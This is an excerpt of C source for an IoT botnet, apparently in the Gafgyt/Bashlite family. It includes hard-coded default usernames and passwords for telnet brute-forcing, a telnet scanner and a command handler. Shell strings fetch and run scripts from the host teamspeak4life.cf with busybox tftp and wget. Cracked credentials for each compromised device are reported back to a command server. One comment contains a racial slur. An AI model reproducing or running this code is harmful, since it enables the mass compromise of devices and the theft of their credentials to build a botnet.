...
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "guest\0", "cisco\0", "Administrator\0", "sa\0", "bbsd-client\0", "hsa\0", "cmaker\0", "netrangr\0", "CISCO15\0", "wlse\0", "wlseuser\0", "support\0"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "cisco\0", "letmein\0", "diamond\0", "changeme2\0", "NULL\0", "Cisco\0", "cmaker\0", "hsadb\0", "blender\0", "attack\0", "wlsedb\0", "wlsepassword\0", "dreambox\0", "support\0"};
...
void updateBin()
{
        ...
        if ( (pid = fork()) == 0) {
				system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox tftp teamspeak4life.cf -c get tftp.sh;busybox chmod +x tftp.sh;sh tftp.sh;busybox tftp -r tftp1.sh -g teamspeak4life.cf; busybox chmod +x tftp1.sh;sh tftp1.sh;wget http://teamspeak4life.cf/gtop.sh || busybox wget http://teamspeak4life.cf.cf/gtop.sh; chmod +x gtop.sh || busybox chmod +x gtop.sh;sh gtop.sh");
                sleep(20);
        } else {
                printf("%d\n", pid);
        }
        ...
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        ...
                        case 9:
                                {
                                        ...
                                        if(send(fds[i].fd, "cd /tmp || cd /var/run;wget http://teamspeak4life.cf/gtop.sh;sh gtop.sh;rm gtop.sh;tftp -r tftp1.sh -g  teamspeak4life.cf;chmod 777 tftp1.sh;sh tftp1.sh\r\n", 154, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;
                        ...
                        case 10:
                                {
                                        echoLoader();
                                        send(fds[i].fd, "sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\r\n", 61, MSG_NOSIGNAL); // sending shell command 3 times to assure execution.
                                        fds[i].state = 11;
                                }
                        ...
                        case 12:
                                {
										...
										else if(readUntil(fds[i].fd, "gayfgt", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
										{
												...
												fds[i].bufUsed = 0;
                                                echoLoader();
                                                send(fds[i].fd, "sh x;chmod +x z;./z;rm -rf z;rm -f x\r\n", 38, MSG_NOSIGNAL); // wow nigga im paranoid affff
                                                sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
												memset(fds[i].sockbuf, 0, 1024);
												sclose(fds[i].fd);
												fds[i].complete = 1;
...
void processCmd(int argc, unsigned char *argv[])
{
  int x;
        ...
        if(!strcmp(argv[0], "TELSCANNER"))
        {
                ...
                {
                        if(scanPid == 0) return;
                        sockprintf(mainCommSock, "TELSCANNER STOPPED!");
                        kill(scanPid, 9);
                        scanPid = 0;
                }
                ...
                if(!strcmp(argv[1], "ON"))
                {
						...
						sockprintf(mainCommSock, "TELSCANNER STARTED!");
